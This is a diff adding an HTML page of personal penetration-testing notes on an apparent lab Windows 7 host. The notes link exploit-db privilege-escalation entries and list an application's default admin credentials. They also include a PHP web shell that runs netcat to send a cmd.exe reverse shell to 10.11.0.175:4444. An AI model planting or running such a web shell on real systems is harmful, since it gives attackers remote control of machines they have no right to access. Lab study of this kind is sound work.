@@ -1,0 +1,54 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>10.11.1.73 Gamma -- Win 7</title>
+</head><body>at low privilege shell.... &nbsp;seems like i need to redirect input/outpot to the semsvc service on an expoit of <b><br/>
+</b><b><br/>
+</b>https://www.exploit-db.com/exploits/31853/<br/>
+<br/>
+or try this:<br/>
+<br/>
+<br/>
+httpd.exe has bad permissions<br/>
+<br/>
+https://www.exploit-db.com/exploits/40967/<b><br/>
+</b><br/>
+<br/>
+<br/>
+If you see "login", you are not connected !<br/>
+<br/>
+After installation, you can use the default administrator user :<br/>
+<br/>
+&nbsp; &nbsp; nickname = admin@admin.bab<br/>
+&nbsp; &nbsp; password = 012345678<br/>
+<br/>
+Declare some other users by administrator interface or by the users themselves<br/>
+<br/>
+We recommand you to declare a new user as administrator. After that, you must delete default administrator for security.<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+root@kali:/var/www/html# cat gamma11.php<br/>
+&lt;?php<br/>
+<br/>
+<br/>
+$output = shell_exec('nc.exe 10.11.0.175 4444 -e cmd.exe');<br/>
+echo "&lt;pre&gt;$output&lt;/pre&gt;";<br/>
+<br/>
+?&gt;<br/>
+root@kali:/var/www/html# <br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<img src="screenshot.png" /><br/>
+<br/>
+click on access rights:<br/>
+<img src="screenshot 2.png" /><br/>
+<br/>
+<br/>
+</body></html>
